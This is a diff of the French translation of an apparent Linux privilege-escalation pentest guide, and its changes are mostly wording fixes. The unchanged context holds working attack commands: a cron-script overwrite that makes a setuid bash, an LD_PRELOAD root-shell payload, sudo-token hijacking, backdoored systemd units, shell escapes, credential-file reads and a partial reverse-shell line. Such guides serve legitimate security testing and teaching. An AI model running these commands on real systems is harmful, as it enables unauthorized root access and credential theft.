@@ -6,7 +6,7 @@
 
 ### Infos sur le système d'exploitation
 
-Commençons par acquérir des connaissances sur le système d'exploitation en cours d'exécution.
+Commençons par acquérir des connaissances sur le système d'exploitation en cours d'exécution
 ```bash
 (cat /proc/version || uname -a ) 2>/dev/null
 lsb_release -a 2>/dev/null # old, not by default on many systems
@@ -18,7 +18,7 @@ Si vous **avez des permissions d'écriture sur un dossier à l'intérieur de la 
 ```bash
 echo $PATH
 ```
-### Infos sur l'environnement
+### Env info
 
 Informations intéressantes, mots de passe ou clés API dans les variables d'environnement ?
 ```bash
@@ -26,7 +26,7 @@ Informations intéressantes, mots de passe ou clés API dans les variables d'env
 ```
 ### Exploits du noyau
 
-Vérifiez la version du noyau et s'il existe un exploit pouvant être utilisé pour élever les privilèges.
+Vérifiez la version du noyau et s'il existe un exploit qui peut être utilisé pour élever les privilèges.
 ```bash
 cat /proc/version
 uname -a
@@ -168,8 +168,8 @@ ps aux
 ps -ef
 top -n 1
 ```
-Toujours vérifier les [**débogueurs electron/cef/chromium**] en cours d'exécution, vous pourriez en abuser pour élever vos privilèges](electron-cef-chromium-debugger-abuse.md). **Linpeas** les détecte en vérifiant le paramètre `--inspect` dans la ligne de commande du processus.\
-Vérifiez également **vos privilèges sur les binaires des processus**, peut-être que vous pouvez écraser quelqu'un.
+Vérifiez toujours les [**débogueurs electron/cef/chromium**] en cours d'exécution, vous pourriez en abuser pour élever vos privilèges](electron-cef-chromium-debugger-abuse.md). **Linpeas** les détecte en vérifiant le paramètre `--inspect` dans la ligne de commande du processus.\
+Vérifiez également **vos privilèges sur les binaires des processus**, peut-être pouvez-vous écraser quelqu'un.
 
 ### Surveillance des processus
 
@@ -189,7 +189,7 @@ Cependant, rappelez-vous que **en tant qu'utilisateur régulier, vous pouvez lir
 > - **kernel.yama.ptrace_scope = 0** : tous les processus peuvent être débogués, tant qu'ils ont le même uid. C'est la manière classique dont ptracing fonctionnait.
 > - **kernel.yama.ptrace_scope = 1** : seul un processus parent peut être débogué.
 > - **kernel.yama.ptrace_scope = 2** : seul l'administrateur peut utiliser ptrace, car cela nécessite la capacité CAP_SYS_PTRACE.
-> - **kernel.yama.ptrace_scope = 3** : Aucun processus ne peut être tracé avec ptrace. Une fois défini, un redémarrage est nécessaire pour activer à nouveau ptracing.
+> - **kernel.yama.ptrace_scope = 3** : Aucun processus ne peut être tracé avec ptrace. Une fois défini, un redémarrage est nécessaire pour réactiver le ptracing.
 
 #### GDB
 
@@ -281,7 +281,7 @@ Si vous constatez que le processus d'authentification est en cours d'exécution 
 ps -ef | grep "authenticator"
 root      2027  2025  0 11:46 ?        00:00:00 authenticator
 ```
-Vous pouvez dumper le processus (voir les sections précédentes pour trouver différentes façons de dumper la mémoire d'un processus) et rechercher des identifiants à l'intérieur de la mémoire :
+Vous pouvez extraire le processus (voir les sections précédentes pour trouver différentes façons d'extraire la mémoire d'un processus) et rechercher des identifiants à l'intérieur de la mémoire :
 ```bash
 ./dump-memory.sh 2027
 strings *.dump | grep -i password
@@ -350,19 +350,19 @@ wildcards-spare-tricks.md
 
 ### Écrasement de script Cron et symlink
 
-Si vous **pouvez modifier un script cron** exécuté par root, vous pouvez obtenir un shell très facilement :
+Si vous **pouvez modifier un script Cron** exécuté par root, vous pouvez obtenir un shell très facilement :
 ```bash
 echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
 #Wait until it is executed
 /tmp/bash -p
 ```
-Si le script exécuté par root utilise un **répertoire où vous avez un accès total**, il pourrait être utile de supprimer ce dossier et **de créer un dossier de symlink vers un autre** servant un script contrôlé par vous.
+Si le script exécuté par root utilise un **répertoire où vous avez un accès complet**, il pourrait être utile de supprimer ce dossier et **de créer un dossier de symlink vers un autre** servant un script contrôlé par vous.
 ```bash
 ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
 ```
 ### Tâches cron fréquentes
 
-Vous pouvez surveiller les processus pour rechercher ceux qui sont exécutés toutes les 1, 2 ou 5 minutes. Peut-être pouvez-vous en profiter et élever les privilèges.
+Vous pouvez surveiller les processus pour rechercher des processus qui sont exécutés toutes les 1, 2 ou 5 minutes. Peut-être que vous pouvez en profiter et élever les privilèges.
 
 Par exemple, pour **surveiller toutes les 0,1s pendant 1 minute**, **trier par les commandes les moins exécutées** et supprimer les commandes qui ont été exécutées le plus, vous pouvez faire :
 ```bash
@@ -380,7 +380,7 @@ Il est possible de créer un cronjob **en mettant un retour chariot après un co
 
 ### Fichiers _.service_ modifiables
 
-Vérifiez si vous pouvez écrire dans un fichier `.service`, si c'est le cas, vous **pourriez le modifier** pour qu'il **exécute** votre **backdoor lorsque** le service est **démarré**, **redémarré** ou **arrêté** (peut-être devrez-vous attendre que la machine redémarre).\
+Vérifiez si vous pouvez écrire dans un fichier `.service`, si c'est le cas, vous **pourriez le modifier** pour qu'il **exécute** votre **backdoor lorsque** le service est **démarré**, **redémarré** ou **arrêté** (vous devrez peut-être attendre que la machine redémarre).\
 Par exemple, créez votre backdoor à l'intérieur du fichier .service avec **`ExecStart=/tmp/script.sh`**
 
 ### Binaires de service modifiables
@@ -399,13 +399,13 @@ ExecStart=faraday-server
 ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
 ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
 ```
-Ensuite, créez un **exécutable** avec le **même nom que le binaire du chemin relatif** dans le dossier PATH de systemd où vous pouvez écrire, et lorsque le service est demandé pour exécuter l'action vulnérable (**Démarrer**, **Arrêter**, **Recharger**), votre **porte dérobée sera exécutée** (les utilisateurs non privilégiés ne peuvent généralement pas démarrer/arrêter des services, mais vérifiez si vous pouvez utiliser `sudo -l`).
+Ensuite, créez un **exécutable** avec le **même nom que le binaire du chemin relatif** à l'intérieur du dossier PATH de systemd dans lequel vous pouvez écrire, et lorsque le service est demandé pour exécuter l'action vulnérable (**Démarrer**, **Arrêter**, **Recharger**), votre **porte dérobée sera exécutée** (les utilisateurs non privilégiés ne peuvent généralement pas démarrer/arrêter des services, mais vérifiez si vous pouvez utiliser `sudo -l`).
 
 **En savoir plus sur les services avec `man systemd.service`.**
 
 ## **Minuteurs**
 
-Les **minuteurs** sont des fichiers d'unité systemd dont le nom se termine par `**.timer**` qui contrôlent les fichiers `**.service**` ou les événements. Les **minuteurs** peuvent être utilisés comme une alternative à cron car ils ont un support intégré pour les événements de temps calendaire et les événements de temps monotoniques et peuvent être exécutés de manière asynchrone.
+Les **minuteurs** sont des fichiers d'unité systemd dont le nom se termine par `**.timer**` qui contrôlent les fichiers ou événements `**.service**`. Les **minuteurs** peuvent être utilisés comme une alternative à cron car ils ont un support intégré pour les événements de temps calendaire et les événements de temps monotoniques et peuvent être exécutés de manière asynchrone.
 
 Vous pouvez énumérer tous les minuteries avec :
 ```bash
@@ -413,7 +413,7 @@ systemctl list-timers --all
 ```
 ### Minuteries modifiables
 
-Si vous pouvez modifier un minuteur, vous pouvez le faire exécuter certaines instances de systemd.unit (comme un `.service` ou un `.target`)
+Si vous pouvez modifier un minuteries, vous pouvez le faire exécuter certaines instances de systemd.unit (comme un `.service` ou un `.target`)
 ```bash
 Unit=backdoor.service
 ```
@@ -439,7 +439,7 @@ Notez que le **timer** est **activé** en créant un lien symbolique vers celui-
 
 ## Sockets
 
-Les Unix Domain Sockets (UDS) permettent la **communication entre processus** sur les mêmes machines ou différentes dans des modèles client-serveur. Ils utilisent des fichiers de descripteur Unix standard pour la communication inter-ordinateurs et sont configurés via des fichiers `.socket`.
+Les Unix Domain Sockets (UDS) permettent la **communication entre processus** sur les mêmes machines ou différentes dans des modèles client-serveur. Ils utilisent des fichiers de descripteur Unix standard pour la communication inter-ordinateur et sont configurés via des fichiers `.socket`.
 
 Les sockets peuvent être configurés à l'aide de fichiers `.socket`.
 
@@ -447,7 +447,7 @@ Les sockets peuvent être configurés à l'aide de fichiers `.socket`.
 
 - `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction` : Ces options sont différentes mais un résumé est utilisé pour **indiquer où il va écouter** le socket (le chemin du fichier socket AF_UNIX, l'IPv4/6 et/ou le numéro de port à écouter, etc.)
 - `Accept` : Prend un argument booléen. Si **vrai**, une **instance de service est créée pour chaque connexion entrante** et seul le socket de connexion lui est passé. Si **faux**, tous les sockets d'écoute eux-mêmes sont **passés à l'unité de service démarrée**, et une seule unité de service est créée pour toutes les connexions. Cette valeur est ignorée pour les sockets datagram et les FIFOs où une seule unité de service gère inconditionnellement tout le trafic entrant. **Par défaut, c'est faux**. Pour des raisons de performance, il est recommandé d'écrire de nouveaux démons uniquement d'une manière qui convient à `Accept=no`.
-- `ExecStartPre`, `ExecStartPost` : Prend une ou plusieurs lignes de commande, qui sont **exécutées avant** ou **après** que les **sockets**/FIFOs d'écoute soient **créés** et liés, respectivement. Le premier token de la ligne de commande doit être un nom de fichier absolu, suivi d'arguments pour le processus.
+- `ExecStartPre`, `ExecStartPost` : Prend une ou plusieurs lignes de commande, qui sont **exécutées avant** ou **après** que les **sockets**/FIFOs d'écoute soient **créés** et liés, respectivement. Le premier jeton de la ligne de commande doit être un nom de fichier absolu, suivi d'arguments pour le processus.
 - `ExecStopPre`, `ExecStopPost` : Commandes supplémentaires qui sont **exécutées avant** ou **après** que les **sockets**/FIFOs d'écoute soient **fermés** et supprimés, respectivement.
 - `Service` : Spécifie le nom de l'unité de **service** **à activer** sur le **trafic entrant**. Ce paramètre n'est autorisé que pour les sockets avec Accept=no. Il par défaut au service qui porte le même nom que le socket (avec le suffixe remplacé). Dans la plupart des cas, il ne devrait pas être nécessaire d'utiliser cette option.
 
@@ -481,7 +481,7 @@ socket-command-injection.md
 
 ### Sockets HTTP
 
-Notez qu'il peut y avoir des **sockets à l'écoute des requêtes HTTP** (_Je ne parle pas des fichiers .socket mais des fichiers agissant comme des sockets unix_). Vous pouvez vérifier cela avec :
+Notez qu'il peut y avoir des **sockets écoutant les requêtes HTTP** (_Je ne parle pas des fichiers .socket mais des fichiers agissant comme des sockets unix_). Vous pouvez vérifier cela avec :
 ```bash
 curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
 ```
@@ -687,14 +687,14 @@ Si vous **connaissez un mot de passe** de l'environnement, **essayez de vous con
 
 ### Su Brute
 
-Si vous ne vous souciez pas de faire beaucoup de bruit et que les binaires `su` et `timeout` sont présents sur l'ordinateur, vous pouvez essayer de forcer le mot de passe des utilisateurs en utilisant [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
+Si vous ne vous souciez pas de faire beaucoup de bruit et que les binaires `su` et `timeout` sont présents sur l'ordinateur, vous pouvez essayer de forcer le mot de passe de l'utilisateur en utilisant [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
 [**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) avec le paramètre `-a` essaie également de forcer le mot de passe des utilisateurs.
 
 ## Abus de PATH écrivable
 
 ### $PATH
 
-Si vous constatez que vous pouvez **écrire dans un dossier du $PATH**, vous pourriez être en mesure d'escalader les privilèges en **créant une porte dérobée dans le dossier écrivable** avec le nom d'une commande qui va être exécutée par un autre utilisateur (root idéalement) et qui **n'est pas chargée depuis un dossier situé avant** votre dossier écrivable dans le $PATH.
+Si vous constatez que vous pouvez **écrire dans un dossier du $PATH**, vous pourriez être en mesure d'escalader les privilèges en **créant une porte dérobée dans le dossier écrivable** avec le nom d'une commande qui va être exécutée par un autre utilisateur (idéalement root) et qui **n'est pas chargée depuis un dossier situé avant** votre dossier écrivable dans le $PATH.
 
 ### SUDO et SUID
 
@@ -736,7 +736,7 @@ Cet exemple, **basé sur la machine HTB Admirer**, était **vulnérable** à **l
 ```bash
 sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
 ```
-### Contournement des chemins d'exécution de Sudo
+### Contournement des chemins d'exécution Sudo
 
 **Sauter** pour lire d'autres fichiers ou utiliser des **symlinks**. Par exemple dans le fichier sudoers : _hacker10 ALL= (root) /bin/less /var/log/\*_
 ```bash
@@ -853,7 +853,7 @@ void inject(){
 system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
 }
 ```
-Ce code, une fois compilé et exécuté, vise à élever les privilèges en manipulant les permissions de fichiers et en exécutant un shell avec des privilèges élevés.
+Ce code, une fois compilé et exécuté, vise à élever les privilèges en manipulant les permissions de fichier et en exécutant un shell avec des privilèges élevés.
 
 Compilez le fichier C ci-dessus en un fichier d'objet partagé (.so) avec :
 ```bash
@@ -894,7 +894,7 @@ cela signifie que la bibliothèque que vous avez générée doit avoir une fonct
 
 [**GTFOBins**](https://gtfobins.github.io) est une liste soigneusement sélectionnée de binaires Unix qui peuvent être exploités par un attaquant pour contourner les restrictions de sécurité locales. [**GTFOArgs**](https://gtfoargs.github.io/) est la même chose mais pour les cas où vous pouvez **uniquement injecter des arguments** dans une commande.
 
-Le projet collecte des fonctions légitimes de binaires Unix qui peuvent être abusées pour sortir de shells restreints, élever ou maintenir des privilèges élevés, transférer des fichiers, créer des shells bind et reverse, et faciliter d'autres tâches de post-exploitation.
+Le projet collecte des fonctions légitimes de binaires Unix qui peuvent être abusées pour sortir de shells restreints, élever ou maintenir des privilèges élevés, transférer des fichiers, créer des shells bind et reverse, et faciliter d'autres tâches post-exploitation.
 
 > gdb -nx -ex '!sh' -ex quit\
 > sudo mysql -e '! /bin/sh'\
@@ -913,7 +913,7 @@ Si vous pouvez accéder à `sudo -l`, vous pouvez utiliser l'outil [**FallOfSudo
 
 Dans les cas où vous avez **un accès sudo** mais pas le mot de passe, vous pouvez élever les privilèges en **attendant l'exécution d'une commande sudo puis en détournant le jeton de session**.
 
-Conditions pour élever les privilèges :
+Exigences pour élever les privilèges :
 
 - Vous avez déjà un shell en tant qu'utilisateur "_sampleuser_"
 - "_sampleuser_" a **utilisé `sudo`** pour exécuter quelque chose dans les **15 dernières minutes** (par défaut, c'est la durée du jeton sudo qui nous permet d'utiliser `sudo` sans introduire de mot de passe)
@@ -922,7 +922,7 @@ Conditions pour élever les privilèges :
 
 (Vous pouvez temporairement activer `ptrace_scope` avec `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ou le modifier de manière permanente en modifiant `/etc/sysctl.d/10-ptrace.conf` et en définissant `kernel.yama.ptrace_scope = 0`)
 
-Si toutes ces conditions sont remplies, **vous pouvez élever les privilèges en utilisant :** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)
+Si toutes ces exigences sont remplies, **vous pouvez élever les privilèges en utilisant :** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)
 
 - Le **premier exploit** (`exploit.sh`) créera le binaire `activate_sudo_token` dans _/tmp_. Vous pouvez l'utiliser pour **activer le jeton sudo dans votre session** (vous n'obtiendrez pas automatiquement un shell root, faites `sudo su`) :
 ```bash
@@ -942,7 +942,7 @@ sudo su
 ```
 ### /var/run/sudo/ts/\<Username>
 
-Si vous avez **des permissions d'écriture** dans le dossier ou sur l'un des fichiers créés à l'intérieur du dossier, vous pouvez utiliser le binaire [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) pour **créer un token sudo pour un utilisateur et un PID**.\
+Si vous avez **des permissions d'écriture** dans le dossier ou sur l'un des fichiers créés à l'intérieur du dossier, vous pouvez utiliser le binaire [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) pour **créer un jeton sudo pour un utilisateur et un PID**.\
 Par exemple, si vous pouvez écraser le fichier _/var/run/sudo/ts/sampleuser_ et que vous avez un shell en tant que cet utilisateur avec le PID 1234, vous pouvez **obtenir des privilèges sudo** sans avoir besoin de connaître le mot de passe en faisant :
 ```bash
 ./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
@@ -1173,11 +1173,11 @@ Le fichier `/etc/profile` et les fichiers sous `/etc/profile.d/` sont **des scri
 ```bash
 ls -l /etc/profile /etc/profile.d/
 ```
-Si un script de profil étrange est trouvé, vous devez vérifier s'il contient des **détails sensibles**.
+Si un script de profil étrange est trouvé, vous devez le vérifier pour **des détails sensibles**.
 
 ### Fichiers Passwd/Shadow
 
-Selon le système d'exploitation, les fichiers `/etc/passwd` et `/etc/shadow` peuvent avoir un nom différent ou il peut y avoir une sauvegarde. Il est donc recommandé de **les trouver tous** et de **vérifier si vous pouvez les lire** pour voir **s'il y a des hachages** à l'intérieur des fichiers :
+Selon le système d'exploitation, les fichiers `/etc/passwd` et `/etc/shadow` peuvent avoir un nom différent ou il peut y avoir une sauvegarde. Par conséquent, il est recommandé de **les trouver tous** et de **vérifier si vous pouvez les lire** pour voir **s'il y a des hachages** à l'intérieur des fichiers :
 ```bash
 #Passwd equivalent files
 cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
@@ -1223,7 +1223,7 @@ ExecStart=/path/to/backdoor
 User=root
 Group=root
 ```
-Votre backdoor sera exécutée la prochaine fois que tomcat sera démarré.
+Votre backdoor sera exécuté la prochaine fois que tomcat sera démarré.
 
 ### Vérifier les Dossiers
 
@@ -1288,7 +1288,7 @@ Lisez le code de [**linPEAS**](https://github.com/carlospolop/privilege-escalati
 ### Journaux
 
 Si vous pouvez lire les journaux, vous pourriez être en mesure de trouver **des informations intéressantes/confidentielles à l'intérieur**. Plus le journal est étrange, plus il sera intéressant (probablement).\
-De plus, certains journaux d'**audit** mal configurés (backdoorés ?) peuvent vous permettre de **enregistrer des mots de passe** à l'intérieur des journaux d'audit comme expliqué dans cet article : [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
+De plus, certains journaux d'**audit** mal configurés (backdoorés ?) peuvent vous permettre de **enregistrer des mots de passe** à l'intérieur des journaux d'audit comme expliqué dans ce post : [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
 ```bash
 aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
 grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
@@ -1323,7 +1323,7 @@ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s
 ```
 ### Exploitation de Logrotate
 
-Une vulnérabilité dans `logrotate` permet aux utilisateurs ayant **des permissions d'écriture** sur un fichier journal ou ses répertoires parents de potentiellement obtenir des privilèges escaladés. Cela est dû au fait que `logrotate`, souvent exécuté en tant que **root**, peut être manipulé pour exécuter des fichiers arbitraires, en particulier dans des répertoires comme _**/etc/bash_completion.d/**_. Il est important de vérifier les permissions non seulement dans _/var/log_ mais aussi dans tout répertoire où la rotation des journaux est appliquée.
+Une vulnérabilité dans `logrotate` permet aux utilisateurs ayant **des permissions d'écriture** sur un fichier journal ou ses répertoires parents de potentiellement obtenir des privilèges élevés. Cela est dû au fait que `logrotate`, souvent exécuté en tant que **root**, peut être manipulé pour exécuter des fichiers arbitraires, en particulier dans des répertoires comme _**/etc/bash_completion.d/**_. Il est important de vérifier les permissions non seulement dans _/var/log_ mais aussi dans tout répertoire où la rotation des journaux est appliquée.
 
 > [!NOTE]
 > Cette vulnérabilité affecte `logrotate` version `3.18.0` et antérieures
@@ -1332,7 +1332,7 @@ Des informations plus détaillées sur la vulnérabilité peuvent être trouvée
 
 Vous pouvez exploiter cette vulnérabilité avec [**logrotten**](https://github.com/whotwagner/logrotten).
 
-Cette vulnérabilité est très similaire à [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(journaux nginx),** donc chaque fois que vous constatez que vous pouvez modifier des journaux, vérifiez qui gère ces journaux et vérifiez si vous pouvez escalader les privilèges en substituant les journaux par des liens symboliques.
+Cette vulnérabilité est très similaire à [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(journaux nginx),** donc chaque fois que vous constatez que vous pouvez modifier des journaux, vérifiez qui gère ces journaux et vérifiez si vous pouvez élever vos privilèges en substituant les journaux par des liens symboliques.
 
 ### /etc/sysconfig/network-scripts/ (Centos/Redhat)
 
@@ -1354,7 +1354,7 @@ DEVICE=eth0
 
 Le répertoire `/etc/init.d` est le foyer des **scripts** pour System V init (SysVinit), le **système de gestion de services Linux classique**. Il comprend des scripts pour `start`, `stop`, `restart`, et parfois `reload` des services. Ceux-ci peuvent être exécutés directement ou via des liens symboliques trouvés dans `/etc/rc?.d/`. Un chemin alternatif dans les systèmes Redhat est `/etc/rc.d/init.d`.
 
-D'autre part, `/etc/init` est associé à **Upstart**, un **système de gestion de services** plus récent introduit par Ubuntu, utilisant des fichiers de configuration pour les tâches de gestion des services. Malgré la transition vers Upstart, les scripts SysVinit sont toujours utilisés aux côtés des configurations Upstart en raison d'une couche de compatibilité dans Upstart.
+D'autre part, `/etc/init` est associé à **Upstart**, un **gestionnaire de services** plus récent introduit par Ubuntu, utilisant des fichiers de configuration pour les tâches de gestion des services. Malgré la transition vers Upstart, les scripts SysVinit sont toujours utilisés aux côtés des configurations Upstart en raison d'une couche de compatibilité dans Upstart.
 
 **systemd** émerge comme un gestionnaire d'initialisation et de services moderne, offrant des fonctionnalités avancées telles que le démarrage de démons à la demande, la gestion de l'automontage et des instantanés de l'état du système. Il organise les fichiers dans `/usr/lib/systemd/` pour les paquets de distribution et `/etc/systemd/system/` pour les modifications administratives, rationalisant le processus d'administration système.
 
@@ -1391,8 +1391,8 @@ cisco-vmanage.md
 
 ### **Meilleur outil pour rechercher des vecteurs d'escalade de privilèges locaux Linux :** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
 
-**LinEnum** : [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
-**Enumy** : [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
+**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
+**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
 **Vérification Privesc Unix :** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
 **Vérificateur de privilèges Linux :** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
 **BeeRoot :** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
